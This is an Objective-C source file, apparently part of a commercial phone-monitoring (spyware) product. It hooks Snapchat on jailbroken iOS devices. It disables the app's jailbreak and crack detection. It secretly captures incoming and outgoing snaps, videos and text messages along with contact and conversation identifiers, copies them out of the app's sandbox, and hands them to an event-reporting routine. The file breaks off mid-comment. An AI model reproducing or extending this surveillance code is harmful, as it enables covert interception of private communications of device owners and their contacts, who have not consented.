//
//  Snapchat701.h
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 5/13/2557 BE.
//
//
//
//  Snapchat.h
//  MSFSP
//
//  Created by benjawan tanarattanakorn on 3/13/2557 BE.
//
//

#import <Foundation/Foundation.h>

#import "DaemonPrivateHome.h"

#import "FeedViewController.h"
#import "SCMediaView.h"
#import "Snap.h"
#import "Snap+9-10-0.h"
#import "Media+Snapchat.h"
#import "Media+Snapchat+9-10-0.h"
#import "MediaDataSource.h"
#import "SCActiveVideoMedia.h"
#import "AVCamCaptureManager.h"
#import "SendViewController.h"
#import "EphemeralMedia.h"
#import "Friend.h"

// v 7.0.1
#import "SCChatViewController.h"
#import "PreviewViewController.h"
#import "SCCaptionManager.h"

#import "SnapchatUtils.h"
#import "SnapchatGroupUtils.h"
#import "SnapchatOfflineUtils.h"

#import "Media+Snapchat.h"
#import "SCChat.h"
#import "SCChat+9-20-0.h"
#import "SCChat+9-25-0.h"
#import "SCText.h"
#import "SCChatMedia.h"
#import "SCMediaCache.h"
#import "FlurryUtil.h"
#import "SCFeedViewController.h"
#import "SCChats.h"
#import "SCChats+9-13-0.h"
#import "User.h"
#import "User+7-0-1.h"
#import "User+9-13-0.h"

// 9.15.0
#import "SCChatMediaMessage.h"
#import "SCSnapPlayController.h"

HOOK(FlurryUtil, appIsCracked, BOOL) {
    DLog(@"-------- NO CRACK ---------");
    return NO;
    //return CALL_ORIG(FlurryUtil, appIsCracked);
}

HOOK(FlurryUtil, deviceIsJailbroken, BOOL) {
    DLog(@"-------- NO JAILBROKEN ---------");
    return NO;
    //return CALL_ORIG(FlurryUtil, deviceIsJailbroken);
}

/*
 
 Version:   7.0.1
 
 -------- 1) Direction: Incoming
 
 1.1 Feed View : image
 
    1) [method A]   HOOK(FeedViewController,  showSnap$, void, id snap)
    2) [method B]   HOOK(SCMediaView, completedSettingImageMedia$error$completion$, void, BOOL media, id error,id completion)
 
 1.2 Feed View: video
 
    1) [method A]
    2) [method C]   HOOK(SCMediaView,  completedSettingVideoMedia$error$completion$, void, BOOL media, id error,id completion)
 
 1.3 Chat View : image
 
    1) [method D]   HOOK(SCChatViewController,  showSnap$, void, id snap)
    2) [method B]
 
 1.4 Chat View: video
 
    1) [method D]
    2) [method C]
 
 
 -------- 2) Direction: Outgoing
 
 2.1 Chat View : image
    1) [method E]   HOOK(PreviewViewController,  sendPressed, void)
    2) [method F]   HOOK(SCChat,  chatDidAddSnapOrMessage$, void, id arg1)
 
 2.2 Feed View : image
    1) [method E]   (NOT USED, so filter)
    2) [method F]
 
 2.3 Chat View: video
    1) [method G]   HOOK(AVCamCaptureManager,  recorder$recordingDidFinishToOutputFileURL$error$, void, id recorder, id recording, id error)
    2) [method E]   (NOT USED, so filter)
    3) [method F]
 
 2.4 Feed View: video
    1) [method G]
    2) [method E]   (NOT USED, so filter)
    3) [method F]
 
 */

#pragma mark Utilities

/*
 * Keep the following information
 * - user id
 * - user display name
 * - chat type
 * - converstation id
 */
void preprocessIncomingSnap(id snap, id me) {
    @try {
        /*
         - 1st times pressed: state 7 status 1 isViewing 0
         - 2nd and 3rd times that views: state 8 status 2 isViewing 1
         */
        BOOL isViewing                  = [snap isViewing];
        if (!isViewing) {
            Snap *_snap                 = snap;
            NSString *userid            = [_snap username];
            NSString *userDisplayname   = [_snap nameForView];
            
            Class $FeedViewController   = objc_getClass("FeedViewController");
            Class $SCChatViewController = objc_getClass("SCChatViewController");
            
            NSString *converID          = nil;
            SCChat *chat                = nil;
            if ([me isKindOfClass:[$FeedViewController class]]) {
                if ([me respondsToSelector:@selector(chatForUsername:)])
                    chat                = [(FeedViewController *)me chatForUsername:userid];
            } else if ([me isKindOfClass:[$SCChatViewController class]]) {
                if ([me respondsToSelector:@selector(chat)])
                    chat                = [(SCChatViewController *)me chat];
            } else {
                // SCFeedViewController >= 9.13.0
                // SCSnapPlayController >= 9.15.0
                SCChats *scChats = [[SnapchatUtils getUser] chats];
                chat = [scChats chatForUsername:userid];
                
                DLog(@"scChats, %@", scChats);
                DLog(@"chat, %@", chat);
                //DLog(@"allChats, %@", [scChats allChats]);
            }
            
            if (chat) {
                converID                = [chat conversationId];
                DLog(@"conver id is available [%@]",converID)
            } else {
                //// !!!! We didn't expect to use user id as conversation id
                converID                = userid;
                DLog(@"conver id is NOT available, so use user id [%@]", converID)
            }
            
            if (converID && [converID length]) {
                // -- move state from UNDEFINED/CAPTURED ---> STARTED
                SnapchatUtils *snUtils  = [SnapchatUtils sharedSnapchatUtils];
                [snUtils setMIncomingState:kSnapchatIncomingStateStarted];
                
                // -- For incoming, set sender id and displayname
                [snUtils setSenderIDForIncoming:userid                                  // user id
                              senderDisplayName:userDisplayname                         // user displayname
                               snapchatChatType:kSnapchatChatTypeInIndividual           // chat type
                                       converID:converID];
            }
        }
    }
    @catch (NSException *exception) {
        DLog(@"Snapchat process snap exception: %@", exception);
    }
    @finally {
        ;
    }
}

/*
 * Write media data to our document directory
 */
NSString* writeMedia (Snap *snap) {
    NSString *mediaPath     = @"";
    
    // -- keep and write media to the document directory
    
    // Case 1: Outgoing Image
    if ([[snap media] isImage]) {
        // -- Write photo attachment to our document directory
        mediaPath = [[[SnapchatUtils sharedSnapchatUtils] mOutgoingPhotoPath] copy];
        [[SnapchatUtils sharedSnapchatUtils] clearOutgoingPhotoPath];
        [mediaPath autorelease];
        
        DLog(@"Captured media path, %@", mediaPath);
        if (!mediaPath || ![mediaPath length]) {
            mediaPath = [SnapchatUtils getOutputPathForExtension:@"png"];
            
            // Check Sandbox iOS 9
            NSString *test = @"Test Write";
            NSData *testData = [test dataUsingEncoding:NSUTF8StringEncoding];
            if (![testData writeToFile:mediaPath atomically:YES]) {
                mediaPath = [IMShareUtils saveData:testData toDocumentSubDirectory:@"/attachments/imSnapchat/" fileName:[mediaPath lastPathComponent]];
            }
            [[NSFileManager defaultManager] removeItemAtPath:mediaPath error:nil];
            
            dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
            dispatch_async(queue, ^(void) {
                @try {
                    int x = 0;
                    while (x++ < 5) {
                        Media *photoMedia   = (Media *)[snap media];
                        NSData *photoData   = [photoMedia mediaDataToUpload];
                        DLog (@"photoData length %lu photoMedia %@", (unsigned long)[photoData length], photoMedia)
                        
                        // Don't need to check Sandbox again...
                        BOOL success = [photoData  writeToFile:mediaPath atomically:YES];
                        DLog (@"photoPath %@ writeOK %d", mediaPath, success)
                        if (success) {
                            break;
                        }
                        
                        [NSThread sleepForTimeInterval:2.0f];
                    }
                }
                @catch (NSException *exception) {
                    DLog(@"Snapchat write snap exception: %@", exception);
                }
                @finally {
                    ;
                }
            });
        }
    }
    // Case 2: Outgoing Video
    else if ([[snap media] isVideo]) {
        mediaPath = [[[SnapchatUtils sharedSnapchatUtils] mOutgoingVideoPath] copy];
        [[SnapchatUtils sharedSnapchatUtils] clearOutgoingVideoPath];
        [mediaPath autorelease];
        
        DLog (@"result video path, %@", mediaPath);
        if (!mediaPath || ![mediaPath length]) {
            mediaPath = [SnapchatUtils getOutputPathForExtension:@"mp4"];
            
            // Check Sandbox iOS 9
            NSString *test = @"Test Write";
            NSData *testData = [test dataUsingEncoding:NSUTF8StringEncoding];
            if (![testData writeToFile:mediaPath atomically:YES]) {
                mediaPath = [IMShareUtils saveData:testData toDocumentSubDirectory:@"/attachments/imSnapchat/" fileName:[mediaPath lastPathComponent]];
            }
            [[NSFileManager defaultManager] removeItemAtPath:mediaPath error:nil];
            
            dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
            dispatch_async(queue, ^(void) {
                @try {
                    int x = 0;
                    while (x++ < 5) {
                        Media *videoMedia   = (Media *)[snap media];
                        
                        // 9.10.0 cannot get snap outgoing path from AVCamCaptureManager hook
                        DLog(@"mediaDataToUpload, %lu", (unsigned long)[[videoMedia mediaDataToUpload] length]);
                        DLog(@"dataToUpload, %lu", (unsigned long)[[videoMedia dataToUpload] length]);
                        //DLog(@"media, %@", videoMedia);
                        //DLog(@"dataSource, %@", [videoMedia dataSource]);
                        //DLog (@"Video media isLoading, %d", [videoMedia isLoading]);
                        //DLog (@"Video media loaded, %d", [videoMedia isLoaded]);
                        
                        NSData *videoData   = [videoMedia mediaDataToUpload];
                        if ([videoData length]) {
                            // Don't need to check Sandbox again...
                            BOOL success    = [videoData  writeToFile:mediaPath atomically:YES];
                            DLog (@"videoPath %@ writeOK %d", mediaPath, success)
                            
                            //DLog (@"Video media Id, %@", [videoMedia mediaId]); // no_id
                            //DLog (@"Video media path, %@", [videoMedia videoPath]); // /private/var/mobile/Containers/Data/Application/9A06E237-CCA7-4996-A85F-141D368761A2/tmp/no_id.mov
                            //DLog (@"videoPath.. with media Id, %@", [[videoMedia class] videoPathWithMediaId:[videoMedia mediaId]]);
                            break;
                        }
                        
                        [NSThread sleepForTimeInterval:2.0];
                    }
                }
                @catch (NSException *exception) {
                    DLog(@"Snapchat write snape exception: %@", exception);
                }
                @finally {
                    ;
                }
            });
        }
    }
    // CASE 3: Undefined Media Type
    else {
        DLog (@"!!!!!!!!!! UNDEFINED MEDIA TYPE !!!!!!!!!!!!")
    }
    return mediaPath;
}


#pragma mark -
#pragma mark INCOMING Snap
#pragma mark -


#pragma mark In Photo Feed View (Step 1) A
#pragma mark In Video Feed View (Step 1)

/*
 * Capture sender (3rd party account) information for individual photo and video chat
 * direction:   Incoming
 * chat type:   Photo and Video on Feed View
 * step:        1/2
 * usecase:     User presses and hold the row of feed view
 */
HOOK(FeedViewController,  showSnap701$, void, id snap) {
    DLog(@"&&&&&&&&&&&&&& FeedViewController --> showSnap (7.0.1 up) &&&&&&&&&&&&&&\n\n");
    //DLog(@"snap %@", snap);
    /*
     - 1st times pressed: state 7 status 1 isViewing 0
     - 2nd and 3rd times that views: state 8 status 2 isViewing 1
     */
    CALL_ORIG(FeedViewController, showSnap701$, snap);
    
    preprocessIncomingSnap(snap, self);
}

HOOK(SCFeedViewController,  showSnap9_13_0$, void, id snap) {
    DLog(@"&&&&&&&&&&&&&& SCFeedViewController --> showSnap (9.13.0 up) &&&&&&&&&&&&&&\n\n");
    
    DLog(@"snap: %@", snap);
    
    CALL_ORIG(SCFeedViewController, showSnap9_13_0$, snap);
    
    preprocessIncomingSnap(snap, self);
}

// 9.15.0,...,9.25.0
HOOK(SCSnapPlayController, showSnap9_15_0$, void, id snap) {
    DLog(@"&&&&&&&&&&&&&& SCSnapPlayController --> showSnap (9.15.0 up) &&&&&&&&&&&&&&\n\n");
    
    DLog(@"snap: %@", snap);
    
    CALL_ORIG(SCSnapPlayController, showSnap9_15_0$, snap);
    
    preprocessIncomingSnap(snap, self);
}

#pragma mark In Photo Chat View (Step 1) D
#pragma mark In Video Chat View (Step 1)

/*
 * Capture sender (3rd party account) information for individual photo chat
 * direction:   Incoming
 * chat type:   Photo and Video on Chat View 
 * step:        1/2
 * usecase:     User presses and hold the row of feed view
 */
HOOK(SCChatViewController,  showSnap$, void, id snap) {
    DLog(@"&&&&&&&&&&&&&& SCChatViewController --> showSnap (7.0.1) &&&&&&&&&&&&&&\n\n");
    //DLog(@"snap %@", snap);
    CALL_ORIG(SCChatViewController, showSnap$, snap);
    
    preprocessIncomingSnap(snap, self);
}


#pragma mark In Photo Feed View (Step 2) B
#pragma mark In Photo Chat View (Step 2)

/*
 * Capture incoming Photo Attachment and Target information
 * direction:   Incoming
 * chat type:   Photo on Chat View
 * step         2/2
 * chat type    Photo on Feed View
 * step         2/2
 * usecase:     User presses and hold one photo item on Chat View
 *              User presses and hold the row of Feed View
 */
HOOK(SCMediaView, completedSettingImageMedia701$error$completion$, void, BOOL media, id error,id completion) {
    DLog(@"&&&&&&&&&&&&&& SCMediaView --> completedSettingImageMedia701$error$completion$ &&&&&&&&&&&&&&\n\n");
    DLog(@"media %d error %@", media, error);
    
    CALL_ORIG(SCMediaView, completedSettingImageMedia701$error$completion$, media, error,  completion);
    
    SnapchatUtils *snUtils = [SnapchatUtils sharedSnapchatUtils];
    DLog (@"our incoming state %d", [snUtils mIncomingState])
    
    /*
     Possible State:
     Started:    In case that we pass the previous hook method
     Undefined:  In case that this is first incoming story event
     Captured:   In case that the last individual incoming has been passed the below condition
     already, and no next individual incoming yet.
     So, incoming story cannot pass the below condition
     */
    if ([snUtils mIncomingState] == kSnapchatIncomingStateStarted) {
        
        // move state from STARTED ---> CAPTURED
        [snUtils setMIncomingState:kSnapchatIncomingStateCaptured];
        
        // -- Get Image and write to our document directory
        UIImage *img                        = [[self imageView] image];
        NSString *snapchatAttachmentPath	= [SnapchatUtils getOutputPathForExtension:@"png"];
        [UIImagePNGRepresentation(img) writeToFile:snapchatAttachmentPath atomically:YES];
        
        /* -- Capture only individual photo, not story photo
         we have this condition before we check state in the previous condition
         */
        if ([snUtils mSnapchatChatType] == kSnapchatChatTypeInIndividual) {
            DLog (@"Capture Individual Incoming Photo");
            
            NSString *converID              = [snUtils mConversationID];
            
            if (converID && [converID length]) {
                [SnapchatUtils sendIncomingIMEventForSenderID:[snUtils mSenderID]                   // this value is kept in the previous hooked method [FeedViewController showSnap:]
                                            senderDisplayName:[snUtils mSenderDisplayName]          // this value is kept in the previous hooked method [FeedViewController showSnap:]
                                                    mediaPath:snapchatAttachmentPath
                                                     converID:converID];
            }
        }
        [snUtils resetSenderInfoForIncoming];
    }
}

// 9.18.1,9.25.0
HOOK(SCMediaView, completedSettingImageMedia$playWhenLoaded$showCounter$error$completion$, void, BOOL media, BOOL loaded, BOOL counter, id error,id completion) {
    DLog(@"&&&&&&&&&&&&&& SCMediaView --> completedSettingImageMedia$playWhenLoaded$showCounter$error$completion$ &&&&&&&&&&&&&&\n\n");
    //DLog(@"media %d error %@", media, error);
    
    CALL_ORIG(SCMediaView, completedSettingImageMedia$playWhenLoaded$showCounter$error$completion$, media, loaded, counter, error, completion);
    
    @try {
        SnapchatUtils *snUtils = [SnapchatUtils sharedSnapchatUtils];
        DLog (@"our incoming state %d", [snUtils mIncomingState])
        
        /*
         Possible State:
         Started:    In case that we pass the previous hook method
         Undefined:  In case that this is first incoming story event
         Captured:   In case that the last individual incoming has been passed the below condition
         already, and no next individual incoming yet.
         So, incoming story cannot pass the below condition
         */
        if ([snUtils mIncomingState] == kSnapchatIncomingStateStarted) {
            
            // move state from STARTED ---> CAPTURED
            [snUtils setMIncomingState:kSnapchatIncomingStateCaptured];
            
            // -- Get Image and write to our document directory
            UIImage *img                        = [[self imageView] image];
            NSString *snapchatAttachmentPath	= [SnapchatUtils getOutputPathForExtension:@"png"];
            if (![UIImagePNGRepresentation(img) writeToFile:snapchatAttachmentPath atomically:YES]) {
                // Sandbox, iOS 9
                snapchatAttachmentPath = [IMShareUtils saveData:UIImagePNGRepresentation(img) toDocumentSubDirectory:@"attachments/imSnapchat/" fileName:[snapchatAttachmentPath lastPathComponent]];
            }
            
            /* -- Capture only individual photo, not story photo
             we have this condition before we check state in the previous condition
             */
            if ([snUtils mSnapchatChatType] == kSnapchatChatTypeInIndividual) {
                DLog (@"Capture Individual Incoming Photo");
                
                NSString *converID              = [snUtils mConversationID];
                
                if (converID && [converID length]) {
                    [SnapchatUtils sendIncomingIMEventForSenderID:[snUtils mSenderID]                   // this value is kept in the previous hooked method [FeedViewController showSnap:]
                                                senderDisplayName:[snUtils mSenderDisplayName]          // this value is kept in the previous hooked method [FeedViewController showSnap:]
                                                        mediaPath:snapchatAttachmentPath
                                                         converID:converID];
                }
            }
            [snUtils resetSenderInfoForIncoming];
        }
    }
    @catch (NSException *exception) {
        DLog(@"Snapchat snap photo exception: %@", exception);
    }
    @finally {
        ;
    }
}

#pragma mark In Video Feed View (Step 2) C
#pragma mark In Video Chat View (Step 2)

/*
 * Capture incoming Video Attachment and Target information
 * direction:   Incoming
 * chat type:   Video on Chat View
 * step         2/2
 * chat type    Video on Feed View
 * step         2/2
 * usecase:     User presses and hold one video item on Chat View
 *              User presses and hold the row of Feed View
 */
HOOK(SCMediaView,  completedSettingVideoMedia701$error$completion$, void, BOOL media, id error,id completion) {
    DLog(@"&&&&&&&&&&&&&& SCMediaView --> VIDEO completedSettingVideoMedia$error$completion$ &&&&&&&&&&&&&&\n\n");
    DLog(@"media %d", media);
    DLog(@"activeVideos %@",       [self activeVideos]);  // NSArray of SCActiveVideoMedia
    
    NSArray *activeVideoArray               = [(NSDictionary *)[self activeVideos] allValues];
    SnapchatUtils *snUtils                  = [SnapchatUtils sharedSnapchatUtils];
    
    for (SCActiveVideoMedia *aSCActiveMedia in activeVideoArray) {
        Media *mediaObj                     = [aSCActiveMedia media];
        NSString *mediaID                   = [mediaObj mediaId];
        DLog (@"MEDIA ID %@ mediaObj %@", mediaID, mediaObj);
        
        // Process only non-duplicated one
        if (![snUtils isDuplicateMediaID:mediaID]) {
            id dataSource                   = [[aSCActiveMedia media ] dataSource];                 // exptected to be Snap
            Class $Snap                     = objc_getClass("Snap");
            //DLog(@"captionText %@",        [mediaObj captionText]);
            //DLog(@"overlayDataToUpload %@", [mediaObj overlayDataToUpload]);
            DLog(@"dataSource %@", dataSource);
            
            if ([dataSource isKindOfClass:$Snap]) {
                Snap *snap                  = dataSource;
                NSString *senderID          = [snap username];                              // get user id
                NSString *senderDisplayName = [snap nameForView];                           // get user display name
                
                // copy from Snapchat sandbox to our document folder
                NSString *snapchatAttachmentPath    = [SnapchatUtils getOutputPathForExtension:@"mov"];
                NSError *copyError                  = nil;
                NSString *origVideoPath             = [mediaObj videoPath];
                DLog(@"original videoPath: %@", origVideoPath);
                
                NSString *converID      = [snUtils mConversationID];
                
                if (converID && [converID length]) {
                    
                    BOOL success                = [[NSFileManager defaultManager] copyItemAtPath:origVideoPath
                                                                                          toPath:snapchatAttachmentPath
                                                                                           error:&copyError];
                    DLog(@"user id [%@] display name [%@]", senderID, senderDisplayName);
                    
                    if (success && !copyError) {
                        DLog(@"!!! Success to write incoming video to path %@", snapchatAttachmentPath);
                        NSString *converID      = [snUtils mConversationID];
                        DLog (@"converid %@", converID)
                        //if (converID && [converID length]) {
                            [SnapchatUtils sendIncomingIMEventForSenderID:senderID
                                                        senderDisplayName:senderDisplayName
                                                                mediaPath:snapchatAttachmentPath
                                                                 converID:converID];
                            [snUtils resetMediaIDWith:[(NSDictionary *)[self activeVideos] allKeys]];
                        //}
                    } else {
                        DLog(@"FAIL to copy original video to our document directory (success:%d, error:%@)", success, error)
                    }
   
                }
            }
        } else {
            DLog (@"!!!! duplicated media id %@", mediaID);
        }
    }
    
    CALL_ORIG(SCMediaView, completedSettingVideoMedia701$error$completion$, media, error,  completion);
}

// 9.18.1,9.25.0
HOOK(SCMediaView,  completedSettingVideoMedia$playWhenLoaded$showCounter$error$completion$, void, BOOL media, BOOL loaded, BOOL counter, id error,id completion) {
    DLog(@"&&&&&&&&&&&&&& SCMediaView --> VIDEO completedSettingVideoMedia$error$completion$ &&&&&&&&&&&&&&\n\n");
    //DLog(@"media %d", media);
    //DLog(@"activeVideos %@",       [self activeVideos]);  // NSArray of SCActiveVideoMedia
    
    @try {
        NSArray *activeVideoArray               = [(NSDictionary *)[self activeVideos] allValues];
        SnapchatUtils *snUtils                  = [SnapchatUtils sharedSnapchatUtils];
        
        for (SCActiveVideoMedia *aSCActiveMedia in activeVideoArray) {
            Media *mediaObj                     = [aSCActiveMedia media];
            NSString *mediaID                   = [mediaObj mediaId];
            DLog (@"MEDIA ID %@ mediaObj %@", mediaID, mediaObj);
            
            // Process only non-duplicated one
            if (![snUtils isDuplicateMediaID:mediaID]) {
                id dataSource                   = [[aSCActiveMedia media ] dataSource];                 // exptected to be Snap
                Class $Snap                     = objc_getClass("Snap");
                //DLog(@"captionText %@",        [mediaObj captionText]);
                //DLog(@"overlayDataToUpload %@", [mediaObj overlayDataToUpload]);
                DLog(@"dataSource %@", dataSource);
                
                if ([dataSource isKindOfClass:$Snap]) {
                    Snap *snap                  = dataSource;
                    NSString *senderID          = [snap username];                              // get user id
                    NSString *senderDisplayName = [snap nameForView];                           // get user display name
                    
                    // copy from Snapchat sandbox to our document foldre
                    NSString *snapchatAttachmentPath    = [SnapchatUtils getOutputPathForExtension:@"mov"];
                    NSError *copyError                  = nil;
                    NSString *origVideoPath             = [mediaObj videoPath];
                    DLog(@"original videoPath: %@", origVideoPath);
                    
                    NSString *converID      = [snUtils mConversationID];
                    
                    if (converID && [converID length]) {
                        // Use file manager to copy, escape from iOS 9 Sandbox
                        BOOL success                = [[NSFileManager defaultManager] copyItemAtPath:origVideoPath
                                                                                              toPath:snapchatAttachmentPath
                                                                                               error:&copyError];
                        DLog(@"user id [%@] display name [%@]", senderID, senderDisplayName);
                        
                        if (success && !copyError) {
                            DLog(@"!!! Success to write incoming video to path %@", snapchatAttachmentPath);
                            NSString *converID      = [snUtils mConversationID];
                            DLog (@"converid %@", converID)
                            //if (converID && [converID length]) {
                            [SnapchatUtils sendIncomingIMEventForSenderID:senderID
                                                        senderDisplayName:senderDisplayName
                                                                mediaPath:snapchatAttachmentPath
                                                                 converID:converID];
                            [snUtils resetMediaIDWith:[(NSDictionary *)[self activeVideos] allKeys]];
                            //}
                        } else {
                            DLog(@"FAIL to copy original video to our document directory (success:%d, error:%@)", success, error)
                        }
                        
                    }
                }
            } else {
                DLog (@"!!!! duplicated media id %@", mediaID);
            }
        }
    }
    @catch (NSException *exception) {
        DLog(@"Snapchat snap video exception: %@", exception);
    }
    @finally {
        ;
    }
    
    CALL_ORIG(SCMediaView, completedSettingVideoMedia$playWhenLoaded$showCounter$error$completion$, media, loaded, counter, error,  completion);
}

#pragma mark -
#pragma mark OUTGOING
#pragma mark - 


#pragma mark Out Photo Chat View (Step 1) E

/*
 * Capture Outgoing Photo path on Chat View
 * direction:   outgoing
 * chat type:   Photo on Chat View
 * step         1/2
 * usecase:     User open Chat View, then press Camera button to send a photo
 */
HOOK(PreviewViewController,  sendPressed, void) {
    DLog(@"&&&&&&&&&&&&&& PreviewViewController --> sendPressed &&&&&&&&&&&&&&\n\n");
    DLog(@"quickSend %d",           [self quickSend])
    DLog(@"getPageViewParams %@",   [self getPageViewParams])  // NSDictionary whose key is "type" and values is IMAGE and VIDEO
    
    // send by individual chat view controller, not from the chat list view
    if ([self respondsToSelector:@selector(quickSend)] && [self quickSend]) {
        NSString *snapchatAttachmentPath    = nil;
        
        // -- Check if the media is IMAGE or Video
        NSString *type                      = [(NSDictionary *)[self getPageViewParams] objectForKey:@"type"];
        
        // Case 1: Outgoing Image
        if ([type isEqualToString:@"IMAGE"]) {
            DLog (@"!!! Capture Individual Outgoing Photo (v 7.0.1 up)!!!");
            // -- Write photo attachment to our document directory
            snapchatAttachmentPath          = [SnapchatUtils getOutputPathForExtension:@"png"];
            [snapchatAttachmentPath copy];
            DLog (@"photo path %@", snapchatAttachmentPath);
            
            UIImage *image = nil;
            
            // Snapchat prior to 7.0.7
            if ([self respondsToSelector:@selector(getImage)]) {
                image                  = [self getImage]; // get image with drawing and caption
            }
            // Snapchat 7.0.7
            else {
                image = [SnapchatUtils getImageFromView:[self containerView]];                 // Get image from current context
            }
            
            NSData *photoData               = UIImagePNGRepresentation(image);
            BOOL success                    = [photoData writeToFile:snapchatAttachmentPath atomically:YES];
            if (success) {
                DLog(@"!!! Success to write incoming photo attachment %@", snapchatAttachmentPath);
                [[SnapchatUtils sharedSnapchatUtils] saveOutgoingPhotoPath:snapchatAttachmentPath];     // keep the path of video attachment which is in our document directory
            }
           [snapchatAttachmentPath release];
        }
    }
    CALL_ORIG(PreviewViewController, sendPressed);
}

#pragma mark Out Video Feed View (Step 1)
#pragma mark Out Video Chat View (Step 1)


/*
 * Capture Video Attachment and Target information for OUTGOING
 * direction:   Outgoing
 * chat type:   Video on Feed View
 * step:        1/2
 * chat type:   Video on Chat View
 * step:        1/2
 * usecase:     User open Feed View, then press Camera button to record and send video
 *              User open Chat View, then press Camera button to record and send video
 */
HOOK(AVCamCaptureManager,  recorder701$recordingDidFinishToOutputFileURL$error$, void, id recorder, id recording, id error) {
    DLog(@"\n\n&&&&&&&&&&&&&& AVCamCaptureManager --> recorder  recordingDidFinishToOutputFileURL &&&&&&&&&&&&&&\n\n");
    NSURL *recordFileURL                = recording;
    NSString *recordFileURLString       = [recordFileURL path];
    
    // copy from Snapchat sandbox to our document foldre
    NSString *snapchatAttachmentPath    = [SnapchatUtils getOutputPathForExtension:@"mp4"];
    NSError *copyError                  = nil;
    BOOL success                        = [[NSFileManager defaultManager] copyItemAtPath:recordFileURLString
                                                                                  toPath:snapchatAttachmentPath
                                                                                   error:&copyError];
    DLog(@"original videoPath: %@", recordFileURLString);
    
    if (success && !copyError) {
        DLog(@"Success to write incoming video to path %@", snapchatAttachmentPath);
        [[SnapchatUtils sharedSnapchatUtils] saveOutgoingVideoPath:snapchatAttachmentPath];     // keep the path of video attachment which is in our document directory
    } else {
        DLog(@"!!!FAIL to capture video file (success:%d, error:%@)", success, copyError)
    }
    
    CALL_ORIG(AVCamCaptureManager, recorder701$recordingDidFinishToOutputFileURL$error$, recorder, recording, error );
}

// For snapchat 9.1.3, recorder701$recordingDidFinishToOutputFileURL$error$ is not called anymore, so use this method instead
HOOK(AVCamCaptureManager,  videoCapturePipeline$didFinishRecordingToURL$, void, id arg1, id arg2) {
    DLog(@"\n\n&&&&&&&&&&&&&& AVCamCaptureManager --> videoCapturePipeline$didFinishRecordingToURL$ &&&&&&&&&&&&&&\n\n");
    DLog (@"arg1 %@", arg1)
    DLog (@"arg2 %@", arg2)
    
    NSURL *recordFileURL                = arg2;
    NSString *recordFileURLString       = [recordFileURL path];
    
    // copy from Snapchat sandbox to our document folder
    NSString *snapchatAttachmentPath    = [SnapchatUtils getOutputPathForExtension:@"mp4"];
    NSError *copyError                  = nil;
    BOOL success                        = [[NSFileManager defaultManager] copyItemAtPath:recordFileURLString
                                                                                  toPath:snapchatAttachmentPath
                                                                                   error:&copyError];
    DLog(@"original videoPath: %@", recordFileURLString);
    
    if (success && !copyError) {
        DLog(@"Success to write incoming video to path %@", snapchatAttachmentPath);
        [[SnapchatUtils sharedSnapchatUtils] saveOutgoingVideoPath:snapchatAttachmentPath];     // keep the path of video attachment which is in our document directory
    } else {
        DLog(@"!!!FAIL to capture video file (success:%d, error:%@)", success, copyError)
    }

    CALL_ORIG(AVCamCaptureManager, videoCapturePipeline$didFinishRecordingToURL$, arg1, arg2);
  
}

#pragma mark Out Photo Chat View (Step 2)
#pragma mark Out Photo Feed View 

#pragma mark Out Video Chat View (Step 2)
#pragma mark Out Video Feed View (Step 2)

/*
 * Capture Video Attachment and Target information for OUTGOING
 * direction:   Outgoing
 * chat type:   Photo on Chat View
 * step:        2/2
 * chat type:   Photo on Feed View
 * chat type:   Video on Chat View
 * step:        2/2
 * chat type:   Video on Feed View
 * step:        2/2
 * usecase:     User open Feed View, then press Camera button to record and send video
 *              User open Chat View, then press Camera button to record and send video
 */
HOOK(SCChat,  chatDidAddSnapOrMessage$, void, id arg1) {
    DLog(@"&&&&&&&&&&&&&& SCChat --> chatDidAddSnapOrMessage  &&&&&&&&&&&&&&\n\n");
    DLog(@"arg1 %@", arg1);                                 // SCText for text
    
    // Snap for photo
    //DLog(@"mutableMessages %@", [self mutableMessages])
    //DLog(@"draft %@", [self draft])
    //DLog(@"recipientChatTypingState %@", [self recipientChatTypingState])
    //DLog(@"chatTypingState %@", [self chatTypingState])
    //DLog(@"firstMessageToDisplayBelowTheFold %@", [self firstMessageToDisplayBelowTheFold])
    //DLog(@"chatsIterToken %@", [self chatsIterToken])
    //DLog(@"recipientMessageSequences %@", [self recipientMessageSequences])
    //DLog(@"lastReleasedUserSentSnapTimestamp %@", [self lastReleasedUserSentSnapTimestamp])
    //DLog(@"sendingChatMessages %@", [self sendingChatMessages])
    DLog(@"conversationId %@", [self conversationId]);      // devfourvvt~devonevvt1
    DLog(@"iterToken %@", [self iterToken])
    
    Class $SCText                           = objc_getClass("SCText");
    Class $SCChatMedia                      = objc_getClass("SCChatMedia");
    Class $Snap                             = objc_getClass("Snap");
    
    // These variables are for photo and video only
    NSString *captionText                   = nil;
    NSString *mediaPath                     = nil;
    
    // CASE 1: TEXT =====================================================================================
    if ([arg1 isKindOfClass:[$SCText class]]) {
        DLog (@"TEXT MESSAGE")
        
        SCText *scText                  = arg1;
        
        // Find direction
        BOOL isSending = NO;
        if ([scText respondsToSelector:@selector(isSending)]) {
            isSending = [scText isSending];
        } else if ([scText respondsToSelector:@selector(sending)]) {
            isSending = [scText sending];
        } else {
            DLog (@"Capture wrong direction")
        }
        
        FxEventDirection  direction     = isSending ? kEventDirectionOut : kEventDirectionIn;
        NSString *messageText           = [scText text];
        DLog(@"text %@",        [scText text])
        if (direction == kEventDirectionIn) {
            NSString *thirdPartyUsername    = [scText sender];
            NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
            DLog(@"3rd party id %@ display name %@", thirdPartyUsername , thirdPartyDisplayName)
            [SnapchatUtils sendIncomingIMEventForSenderID:thirdPartyUsername
                                        senderDisplayName:thirdPartyDisplayName
                                              messageText:messageText
                                                 converID:[self conversationId]];
            [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] saveNewestSCTextChatMediaTimestamp:[scText timestamp]];
        } else {
            NSString *thirdPartyUsername   =  [scText recipient];
            NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
            DLog(@"3rd party id %@ display name %@", thirdPartyUsername , thirdPartyDisplayName)
            [SnapchatUtils sendOutgoingIMEventForRecipientID:thirdPartyUsername
                                        recipientDisplayName:thirdPartyDisplayName
                                                 messageText:messageText
                                                    converID:[self conversationId]];
        }
        /*
